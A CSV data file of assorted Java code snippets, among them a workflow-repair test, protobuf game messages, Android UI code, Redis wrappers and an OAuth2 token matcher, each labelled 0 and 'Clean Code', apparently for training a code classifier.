text,label,text_label
"@Test public void verifyAndRepairParentWorkflow(){
  WorkflowModel workflow=new WorkflowModel();
  workflow.setWorkflowId(""abcd"");
  workflow.setParentWorkflowId(""parentWorkflowId"");
  when(properties.getWorkflowOffsetTimeout()).thenReturn(Duration.ofSeconds(10));
  when(executionDAO.getWorkflow(""abcd"",true)).thenReturn(workflow);
  when(queueDAO.containsMessage(anyString(),anyString())).thenReturn(false);
  workflowRepairService.verifyAndRepairWorkflowTasks(""abcd"");
  verify(queueDAO,times(1)).containsMessage(anyString(),anyString());
  verify(queueDAO,times(1)).push(anyString(),anyString(),anyLong());
}",0,Clean Code
"@Override public ChessRogueNousSubStoryInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"public AzureOpenAiStreamClient.Builder apiKey(String apiKeyValue){
  this.apiKey=apiKeyValue;
  return this;
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent event){
  if (tabs == null || bounds == null)   return false;
  int index=-1;
  for (int i=0; i < bounds.length; ++i) {
    if (bounds[i].contains(event.getX(),event.getY())) {
      index=i;
      break;
    }
  }
  if (index >= 0 && index != lastPressedIndex) {
    lastPressedIndex=index;
    if (onTabClick != null) {
      onTabClick.run(index);
    }
  }
  if (event.getAction() == MotionEvent.ACTION_UP || event.getAction() == MotionEvent.ACTION_CANCEL) {
    lastPressedIndex=-1;
  }
  if (event.getAction() == MotionEvent.ACTION_DOWN && index >= 0) {
    return true;
  }
  return super.onTouchEvent(event);
}",0,Clean Code
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  m=m.withLeadingAnnotations(withNewlines(m.getLeadingAnnotations()));
  if (!m.getLeadingAnnotations().isEmpty()) {
    if (!m.getModifiers().isEmpty()) {
      m=m.withModifiers(withNewline(m.getModifiers()));
    }
 else     if (m.getAnnotations().getTypeParameters() != null) {
      if (!m.getAnnotations().getTypeParameters().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.getAnnotations().withTypeParameters(m.getAnnotations().getTypeParameters().withPrefix(withNewline(m.getAnnotations().getTypeParameters().getPrefix())));
      }
    }
 else     if (m.getReturnTypeExpression() != null) {
      if (!m.getReturnTypeExpression().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withReturnTypeExpression(m.getReturnTypeExpression().withPrefix(withNewline(m.getReturnTypeExpression().getPrefix())));
      }
    }
 else {
      if (!m.getName().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withName(m.getName().withPrefix(withNewline(m.getName().getPrefix())));
      }
    }
  }
  return m;
}
",0,Clean Code
"@Override public Builder toBuilder(){
  return this == DEFAULT_INSTANCE ? new Builder() : new Builder().mergeFrom(this);
}
",0,Clean Code
"public static RotatorEnergyInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),data).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
",0,Clean Code
"public Builder userName(String userName){
  this.userName=userName;
  return this;
}
",0,Clean Code
"public ConverterImpl(Type firstTargetType,Type secondTargetType){
  this.firstTargetType=firstTargetType;
  this.secondTargetType=secondTargetType;
}
",0,Clean Code
"/** 
 * <code>repeated .HeroBasicTypeInfo basic_type_info_list = 9;</code>
 * @return this
 */
public GetHeroBasicTypeInfoScRsp clearBasicTypeInfoList(){
  bitField0_&=~0x00000008;
  basicTypeInfoList.clear();
  return this;
}",0,Clean Code
"@Test void should_split_sample_text_without_paragraphs(){
  int maxSegmentSize=100;
  Tokenizer tokenizer=new OpenAiTokenizer(GPT_3_5_TURBO);
  String segment1=""In a small town nestled between two vast mountains, there was a shop unlike any other. "" + ""A unique haven. "" + ""Visitors would often comment on its peculiar charm, always slightly different from what they ""+ ""remembered on their previous visits. ""+ ""The store stood as a testament to the passage of time and the ever-changing landscape of tales. ""+ ""Upon entering, the first thing to strike you was the enormity of it all. ""+ ""Every inch of space was occupied with books."";
  String segment2=""Some stood tall and regal on the highest shelves, "" + ""looking as if they had witnessed epochs come and go. "" + ""They were leather-bound, with pages yellowed by age. ""+ ""Others, smaller and brightly adorned, were reminiscent of summer days and childhood laughter. ""+ ""But these physical objects were mere vessels. ""+ ""It was the stories inside that held power. ""+ ""Mrs. Jenkins ran the shop. ""+ ""A mystery in her own right."";
  String segment3=""Her silver hair cascaded like a waterfall, and her eyes seemed to see more than most. "" + ""With just a glance, she'd find the perfect story for you. "" + ""One wet afternoon, Eli entered. ""+ ""He was just a boy, lost in the vastness of the store. ""+ ""Between the aisles, his small fingers danced on the spines of books, feeling the heartbeat of ""+ ""countless tales. ""+ ""Then, a simple brown-covered book whispered to him."";
  String segment4=""Without grandeur or pretense, it beckoned. "" + ""And he listened. "" + ""He read. ""+ ""And read. ""+ ""The world around him melted. ""+ ""When Mrs. Jenkins approached, night had fallen. ""+ ""She gently remarked, \""Books have a way of finding their reader.\"" ""+ ""Eli simply nodded, understanding the profound truth in her words. ""+ ""Some places and stories remain etched in our souls, offering lessons and moments of sheer wonder. ""+ ""They defy definition."";
  Document document=Document.from(format(""%s %s %s %s"",segment1,segment2,segment3,segment4),metadata(""document"",""0""));
  DocumentSplitter splitter=new DocumentByParagraphSplitter(maxSegmentSize,0,tokenizer);
  List<TextSegment> segments=splitter.split(document);
  segments.forEach(segment -> assertThat(tokenizer.estimateTokenCountInText(segment.text())).isLessThanOrEqualTo(maxSegmentSize));
  assertThat(segments).containsExactly(textSegment(segment1,metadata(""index"",""0"").add(""document"",""0"")),textSegment(segment2,metadata(""index"",""1"").add(""document"",""0"")),textSegment(segment3,metadata(""index"",""2"").add(""document"",""0"")),textSegment(segment4,metadata(""index"",""3"").add(""document"",""0"")));
}",0,Clean Code
"public static int[] calcDrawableColor(Drawable drawable){
  int bitmapColor=0xff000000;
  int[] result=new int[4];
  try {
    if (drawable instanceof BitmapDrawable) {
      Bitmap bitmap=((BitmapDrawable)drawable).getBitmap();
      bitmapColor=calcBitmapColor(bitmap);
    }
 else     if (drawable instanceof ColorDrawable) {
      bitmapColor=((ColorDrawable)drawable).getColor();
    }
 else     if (drawable instanceof BackgroundGradientDrawable) {
      int[] colors=((BackgroundGradientDrawable)drawable).getColorsList();
      if (colors != null) {
        if (colors.length > 1) {
          bitmapColor=getAverageColor(colors[0],colors[1]);
        }
 else         if (colors.length > 0) {
          bitmapColor=colors[0];
        }
      }
    }
 else     if (drawable instanceof MotionBackgroundDrawable) {
      result[0]=result[2]=Color.argb(0x2D,0,0,0);
      result[1]=result[3]=Color.argb(0x3D,0,0,0);
      return result;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  double[] hsv=rgbToHsv((bitmapColor >> 16) & 0xff,(bitmapColor >> 8) & 0xff,bitmapColor & 0xff);
  hsv[1]=Math.min(1.0,hsv[1] + 0.05 + 0.1 * (1.0 - hsv[1]));
  double v=Math.max(0,hsv[2] * 0.65);
  int[] rgb=hsvToRgb(hsv[0],hsv[1],v);
  result[0]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[1]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  double v2=Math.max(0,hsv[2] * 0.72);
  rgb=hsvToRgb(hsv[0],hsv[1],v2);
  result[2]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[3]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  return result;
}",0,Clean Code
"@Override public List<StreamEntry> xclaim(String key,String group,String consumername,long minIdleTime,long newIdleTime,int retries,boolean force,StreamEntryID... ids){
  return executeInJedis(jedis -> jedis.xclaim(key,group,consumername,minIdleTime,newIdleTime,retries,force,ids));
}
",0,Clean Code
"private void createContactButtons(){
  if (Build.VERSION.SDK_INT >= 21) {
    createSelectorDrawable(0);
  }
  if (drawContact) {
    int needDrawFlag=0;
    int buttonsCount=0;
    if (drawContactView) {
      needDrawFlag|=1;
      buttonsCount++;
    }
    if (drawContactSendMessage) {
      needDrawFlag|=2;
      buttonsCount++;
    }
    if (drawContactAdd) {
      needDrawFlag|=4;
      buttonsCount++;
    }
    if (buttonsCount == 0) {
      contactButtons=null;
      drawnContactButtonsFlag=0;
      return;
    }
    totalHeight+=AndroidUtilities.dp(60);
    boolean needRecreate=needDrawFlag != drawnContactButtonsFlag;
    if (needRecreate) {
      drawnContactButtonsFlag=0;
      int mWidth=(backgroundWidth - AndroidUtilities.dp(10 + 24 + 10+ 31)) / buttonsCount;
      float parentWidth=(backgroundWidth - AndroidUtilities.dpf2(37)) / buttonsCount;
      if (contactButtons == null) {
        contactButtons=new ArrayList<>(buttonsCount);
      }
 else {
        contactButtons.clear();
      }
      if (drawContactView) {
        drawnContactButtonsFlag|=1;
        String str=LocaleController.getString(""ViewContact"",R.string.ViewContact);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_VIEW,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactSendMessage) {
        drawnContactButtonsFlag|=2;
        String str=LocaleController.getString(""SharedContactMessage"",R.string.SharedContactMessage);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_SEND_MESSAGE,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactAdd) {
        drawnContactButtonsFlag|=4;
        String str=LocaleController.getString(""SharedContactAdd"",R.string.SharedContactAdd);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_ADD,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
    }
  }
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_undo) {
    if (mEditor != null && mEditor.canUndo()) {
      mEditor.undo();
      return true;
    }
  }
 else   if (id == R.id.action_redo) {
    if (mEditor != null && mEditor.canRedo()) {
      mEditor.redo();
      return true;
    }
  }
 else   if (id == R.id.action_wrap) {
    if (mEditor != null) {
      mEditor.setWordwrap(!mEditor.isWordwrap());
      return true;
    }
  }
 else   if (id == R.id.action_save) {
    saveFile();
    return true;
  }
 else   if (id == R.id.action_save_as) {
    launchIntentSaver();
    return true;
  }
 else   if (id == R.id.action_share) {
    Path filePath=mViewModel.getSourceFile();
    if (filePath != null) {
      Intent intent=new Intent(Intent.ACTION_SEND).setType(filePath.getType()).putExtra(Intent.EXTRA_STREAM,FmProvider.getContentUri(filePath)).addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
      startActivity(Intent.createChooser(intent,getString(R.string.share)));
    }
    return true;
  }
 else   if (id == R.id.action_java_smali_toggle) {
    mViewModel.generateJava(mEditor.getText());
  }
 else   if (id == R.id.action_search) {
    if (mSearchWidget != null) {
      if (mSearchWidget.getVisibility() == View.VISIBLE) {
        hideSearchWidget();
      }
 else       showSearchWidget();
    }
  }
  return false;
}
",0,Clean Code
"private static String readTextFile(List<String> filePaths){
  if (filePaths == null || filePaths.isEmpty()) {
    return null;
  }
  Log.v(TAG,""all file path : "" + filePaths.toString());
  StringBuilder content=new StringBuilder();
  for (  String filePath : filePaths) {
    if (!TextUtils.isEmpty(filePath)) {
      content=new StringBuilder();
      File file=new File(filePath);
      if (file.isFile()) {
        Log.v(TAG,""available filePath: "" + filePath);
        if (file.isFile()) {
          InputStream inputStream=null;
          InputStreamReader streamReader=null;
          BufferedReader buffreader=null;
          try {
            inputStream=new FileInputStream(file);
            streamReader=new InputStreamReader(inputStream);
            buffreader=new BufferedReader(streamReader);
            String line;
            while ((line=buffreader.readLine()) != null) {
              content.append(line);
              content.append(""\n"");
            }
            if (!TextUtils.isEmpty(content)) {
              break;
            }
          }
 catch (          java.io.FileNotFoundException e) {
            Log.d(TAG,""The File doesn't not exist."");
          }
catch (          IOException e) {
            Log.d(TAG,e.getMessage());
          }
 finally {
            try {
              if (inputStream != null) {
                inputStream.close();
              }
              if (streamReader != null) {
                streamReader.close();
              }
              if (buffreader != null) {
                buffreader.close();
              }
            }
 catch (            IOException ignore) {
            }
          }
        }
      }
    }
  }
  return content.toString();
}
",0,Clean Code
"public KeyUsecaseEntry parse(AnnotationExpr keyUsecase){
  KeyUsecaseEntry entry=new KeyUsecaseEntry(className,methodName);
  entry.setJavadoc(JavaParserUtil.javadocFirstLineOf(methodDeclaration));
  if (keyUsecase instanceof MarkerAnnotationExpr) {
    return entry;
  }
  NormalAnnotationExpr normalAnnotationExpr=(NormalAnnotationExpr)keyUsecase;
  for (  MemberValuePair memberValuePair : normalAnnotationExpr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""name"":
      this.methodName=AnnotationFieldParser.singleFieldValue(memberValuePair);
    entry.setMethodName(this.methodName);
  break;
case ""remark"":
entry.setRemark(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""consumesKeyEvent"":
entry.setKeyEvent(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""in"":
entry.setIn(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
case ""out"":
entry.setOut(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
}
}
return entry;
}
",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @param other Fallback value in case the value is not known.
 * @return The enum associated with the given numeric wire value, or the fallback value if unknown.
 */
public static DisplayRecordType forNumberOr(int number,DisplayRecordType other){
  DisplayRecordType value=forNumber(number);
  return value == null ? other : value;
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 14;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getMutableBattleInfo(){
  bitField0_|=0x00000010;
  return battleInfo;
}",0,Clean Code
"public long getLength(){
  return (Math.abs((end - start) / step)) + 1;
}",0,Clean Code
"public int getSource(){
  return this.source;
}
",0,Clean Code
"@Benchmark public Object fury_deserialize_compatible(FuryState.FuryCompatibleState state){
  state.buffer.readerIndex(0);
  Object o=state.fury.readRef(state.buffer);
  state.fury.resetRead();
  return o;
}",0,Clean Code
"private TableIndexColumn getTableIndexColumn(ResultSet resultSet) throws SQLException {
  TableIndexColumn tableIndexColumn=new TableIndexColumn();
  tableIndexColumn.setColumnName(resultSet.getString(""COLUMN_NAME""));
  tableIndexColumn.setOrdinalPosition(resultSet.getShort(""COLUMN_POSITION""));
  String collation=resultSet.getString(""DESCEND"");
  if (""ASC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""ASC"");
  }
 else   if (""DESC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""DESC"");
  }
  return tableIndexColumn;
}
",0,Clean Code
"void onResult(int i2,String str,MoveGroupFileResult moveGroupFileResult);",0,Clean Code
"@Override public RogueAction clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  bonusSelectInfo.clearQuick();
  miracleSelectInfo.clearQuick();
  buffSelectInfo.clearQuick();
  return this;
}",0,Clean Code
"@Override public ChessRogueMiracleInfo copyFrom(final ChessRogueMiracleInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    miracleData.copyFrom(other.miracleData);
  }
  return this;
}",0,Clean Code
"public static String queryProjectList(int index){
  return RpcUtil.request(""alipay.antsports.walk.charity.queryProjectList"",""[{\""chInfo\"":\"""" + chInfo + ""\"",\""clientOS\"":\""android\"",\""features\"":[\""DAILY_STEPS_RANK_V2\"",\""STEP_BATTLE\"",\""CLUB_HOME_CARD\"",\""NEW_HOME_PAGE_STATIC\"",\""CLOUD_SDK_AUTH\"",\""STAY_ON_COMPLETE\"",\""EXTRA_TREASURE_BOX\"",\""NEW_HOME_PAGE_STATIC\"",\""SUPPORT_TAB3\"",\""SUPPORT_FLYRABBIT\"",\""PROP\"",\""PROPV2\"",\""ASIAN_GAMES\""],\""index\"":""+ index+ "",\""projectListUseVertical\"":true}]"");
}",0,Clean Code
"@Override public void publish(String subject,byte[] data) throws Exception {
  ensureConnected();
  conn.publish(subject,data);
}
",0,Clean Code
"public Map<String,String> getExternalProperties(){
  return externalProperties;
}
",0,Clean Code
"/** 
 * Joins the elements of the provided  {@code Iterator} intoa single String containing the provided elements.</p> <p/> No delimiter is added before or after the list. A  {@code null} separator is the same as an empty String ("""").</p><p/> Copied from Commons Lang, version 3 (r1138702).</p>
 * @param iterator  the {@code Iterator} of values to join together, may be null
 * @param separator the separator character to use, null treated as """"
 * @return the joined String, {@code null} if null iterator input
 * @since 1.2
 */
public static String join(Iterator<?> iterator,String separator){
  final String empty="""";
  if (iterator == null) {
    return null;
  }
  if (!iterator.hasNext()) {
    return empty;
  }
  Object first=iterator.next();
  if (!iterator.hasNext()) {
    return first == null ? empty : first.toString();
  }
  StringBuilder buf=new StringBuilder(256);
  if (first != null) {
    buf.append(first);
  }
  while (iterator.hasNext()) {
    if (separator != null) {
      buf.append(separator);
    }
    Object obj=iterator.next();
    if (obj != null) {
      buf.append(obj);
    }
  }
  return buf.toString();
}",0,Clean Code
"@Override public Long zlexcount(String key,String min,String max){
  return jedisCluster.zlexcount(key,min,max);
}
",0,Clean Code
"/** 
 * <code>optional uint32 exp = 1;</code>
 * @return this
 */
public RogueHandbookAeon clearExp(){
  bitField0_&=~0x00000001;
  exp=0;
  return this;
}",0,Clean Code
"@Override public void handleTransportError(@NotNull WebSocketSession session,@NotNull Throwable e) throws Exception {
  log.error(""[wss-{}] Transport error"",this.account.getDisplay(),e);
  onFailure(CLOSE_CODE_EXCEPTION,""transport error"");
}
",0,Clean Code
"public static String generateRegular(String raw,int start,int end){
  int newStart=start;
  int newEnd=end;
  String startStr="""";
  String endStr="""";
  String target=raw.substring(start,end);
  String strReg="""";
  if (start > 3) {
    newStart-=3;
  }
 else   if (start > 1) {
    newStart-=1;
  }
  if (end < raw.length() - 3) {
    newEnd+=3;
  }
  for (int i=0; i < raw.length(); i++) {
    startStr=raw.substring(newStart,start);
    startStr=escapeExprSpecialWord(startStr);
    endStr=raw.substring(end,newEnd);
    endStr=escapeExprSpecialWord(endStr);
    strReg=String.format(""%s(.*?)%s"",startStr,endStr);
    System.out.println(""---------------------------------------"");
    System.out.println(strReg);
    BurpExtender.stderr.println(""------------------------------"");
    BurpExtender.stderr.println(""[+] "" + target);
    BurpExtender.stderr.println(strReg);
    if (matchByRegular(raw,strReg).getResult().equals(target)) {
      break;
    }
    if (newStart == 0 && newEnd == raw.length()) {
      break;
    }
    if (newStart > 0) {
      newStart-=1;
    }
    if (newEnd < raw.length()) {
      newEnd+=1;
    }
  }
  return strReg;
}",0,Clean Code
"private static boolean hasToken(OAuth2Authorization authorization,String token,@Nullable OAuth2TokenType tokenType){
  if (tokenType == null) {
    return matchesState(authorization,token) || matchesAuthorizationCode(authorization,token) || matchesAccessToken(authorization,token)|| matchesIdToken(authorization,token)|| matchesRefreshToken(authorization,token)|| matchesDeviceCode(authorization,token)|| matchesUserCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.STATE.equals(tokenType.getValue())) {
    return matchesState(authorization,token);
  }
 else   if (OAuth2ParameterNames.CODE.equals(tokenType.getValue())) {
    return matchesAuthorizationCode(authorization,token);
  }
 else   if (OAuth2TokenType.ACCESS_TOKEN.equals(tokenType)) {
    return matchesAccessToken(authorization,token);
  }
 else   if (OidcParameterNames.ID_TOKEN.equals(tokenType.getValue())) {
    return matchesIdToken(authorization,token);
  }
 else   if (OAuth2TokenType.REFRESH_TOKEN.equals(tokenType)) {
    return matchesRefreshToken(authorization,token);
  }
 else   if (OAuth2ParameterNames.DEVICE_CODE.equals(tokenType.getValue())) {
    return matchesDeviceCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.USER_CODE.equals(tokenType.getValue())) {
    return matchesUserCode(authorization,token);
  }
  return false;
}",0,Clean Code
"/** 
 * <code>optional bool b2 = 8;</code>
 * @param value the b2 to set
 * @return this
 */
public PlayerSettingInfo setB2(final boolean value){
  bitField0_|=0x00000020;
  b2=value;
  return this;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)96);
    output.writeUInt32NoTag(talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)120);
    output.writeEnumNoTag(status);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    for (int i=0; i < unlockProgressList.length(); i++) {
      output.writeRawByte((byte)106);
      output.writeMessageNoTag(unlockProgressList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.talentId,talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeEnum(FieldNames.status,status,RogueTalentStatusOuterClass.RogueTalentStatus.converter());
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRepeatedMessage(FieldNames.unlockProgressList,unlockProgressList);
  }
  output.endObject();
}",0,Clean Code
"public void prepare(){
  ArrayList<SamplePresentationTime> original=new ArrayList<>(samplePresentationTimes);
  Collections.sort(samplePresentationTimes,(o1,o2) -> {
    if (o1.presentationTime > o2.presentationTime) {
      return 1;
    }
 else     if (o1.presentationTime < o2.presentationTime) {
      return -1;
    }
    return 0;
  }
);
  long lastPresentationTimeUs=0;
  sampleDurations=new long[samplePresentationTimes.size()];
  long minDelta=Long.MAX_VALUE;
  boolean outOfOrder=false;
  for (int a=0; a < samplePresentationTimes.size(); a++) {
    SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
    long delta=presentationTime.presentationTime - lastPresentationTimeUs;
    lastPresentationTimeUs=presentationTime.presentationTime;
    sampleDurations[presentationTime.index]=delta;
    if (presentationTime.index != 0) {
      duration+=delta;
    }
    if (delta > 0 && delta < Integer.MAX_VALUE) {
      minDelta=Math.min(minDelta,delta);
    }
    if (presentationTime.index != a) {
      outOfOrder=true;
    }
  }
  if (sampleDurations.length > 0) {
    sampleDurations[0]=minDelta;
    duration+=minDelta;
  }
  for (int a=1; a < original.size(); a++) {
    original.get(a).dt=sampleDurations[a] + original.get(a - 1).dt;
  }
  if (outOfOrder) {
    sampleCompositions=new int[samplePresentationTimes.size()];
    for (int a=0; a < samplePresentationTimes.size(); a++) {
      SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
      sampleCompositions[presentationTime.index]=(int)(presentationTime.presentationTime - presentationTime.dt);
    }
  }
}",0,Clean Code
"public int getForceExit(){
  return this.forceExit;
}
",0,Clean Code
"String getGifUrl();
",0,Clean Code
"@Override public Result<List<Map<String,Object>>> queryFieldInfo(Integer label,Long typeId){
  return null;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(battleInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.battleInfo,battleInfo);
  }
  output.endObject();
}",0,Clean Code
"@AfterAll public static void afterAll(){
  evaluator.close();
}
",0,Clean Code
"private long continueReadVarInt36(int readIdx,long bulkValue,long result){
  readIdx++;
  result|=(bulkValue >>> 2) & 0x1fc000;
  if ((bulkValue & 0x800000) != 0) {
    readIdx++;
    result|=(bulkValue >>> 3) & 0xfe00000;
    if ((bulkValue & 0x80000000L) != 0) {
      readIdx++;
      result|=(bulkValue >>> 4) & 0xff0000000L;
    }
  }
  readerIndex=readIdx;
  return result;
}",0,Clean Code
"public void setAppId(int i2){
  this.appId=i2;
}",0,Clean Code
"public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,boolean isDialog){
  return getTopicSpannedName(topic,paint,null,isDialog);
}
public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,Drawable[] drawableToSet,boolean isDialog){
  SpannableStringBuilder sb=new SpannableStringBuilder();
  if (topic instanceof TLRPC.TL_forumTopic) {
    TLRPC.TL_forumTopic forumTopic=(TLRPC.TL_forumTopic)topic;
    if (forumTopic.id == 1) {
      try {
        Drawable drawable=createGeneralTopicDrawable(ApplicationLoader.applicationContext,1f,paint == null ? Theme.getColor(Theme.key_chat_inMenu) : paint.getColor(),isDialog);
        drawable.setBounds(0,0,paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()),paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()));
        sb.append("" "");
        if (drawableToSet != null) {
          drawableToSet[0]=drawable;
        }
        sb.setSpan(new ImageSpan(drawable,DynamicDrawableSpan.ALIGN_CENTER),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 catch (      Exception e) {
      }
    }
 else     if (forumTopic.icon_emoji_id != 0) {
      sb.append("" "");
      AnimatedEmojiSpan span;
      sb.setSpan(span=new AnimatedEmojiSpan(forumTopic.icon_emoji_id,.95f,paint == null ? null : paint.getFontMetricsInt()),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      span.top=true;
      span.cacheType=AnimatedEmojiDrawable.CACHE_TYPE_ALERT_PREVIEW_STATIC;
    }
 else {
      sb.append("" "");
      Drawable drawable=ForumUtilities.createTopicDrawable(forumTopic,isDialog);
      if (drawableToSet != null) {
        drawableToSet[0]=((CombinedDrawable)drawable).getBackgroundDrawable();
      }
      drawable.setBounds(0,0,(int)(drawable.getIntrinsicWidth() * 0.65f),(int)(drawable.getIntrinsicHeight() * 0.65f));
      if (drawable instanceof CombinedDrawable && ((CombinedDrawable)drawable).getIcon() instanceof LetterDrawable) {
        ((LetterDrawable)((CombinedDrawable)drawable).getIcon()).scale=.7f;
      }
      if (paint != null) {
        ColoredImageSpan imageSpan=new ColoredImageSpan(drawable);
        imageSpan.setSize((int)(Math.abs(paint.getFontMetrics().descent) + Math.abs(paint.getFontMetrics().ascent)));
        sb.setSpan(imageSpan,0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 else {
        sb.setSpan(new ImageSpan(drawable),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
    if (!TextUtils.isEmpty(forumTopic.title)) {
      sb.append("" "");
      sb.append(forumTopic.title);
    }
  }
 else {
    return ""DELETED"";
  }
  return sb;
}",0,Clean Code
"@Override public int getId(){
  return (ID << 8) + WorldLevel;
}",0,Clean Code
"protected ListingOrMappingTypeNode(SourceSection sourceSection,@Nullable TypeNode keyTypeNode,TypeNode valueTypeNode){
  super(sourceSection);
  this.keyTypeNode=keyTypeNode;
  this.valueTypeNode=valueTypeNode;
  skipKeyTypeChecks=keyTypeNode == null || keyTypeNode.isNoopTypeCheck();
  skipValueTypeChecks=valueTypeNode.isNoopTypeCheck();
}
",0,Clean Code
"public static void isNull(Object object,String message){
  if (object != null) {
    throw new IllegalArgumentException(message);
  }
}
public static void isNull(Object object){
  isNull(object,""[Assertion failed] - the object argument must be null"");
}
",0,Clean Code
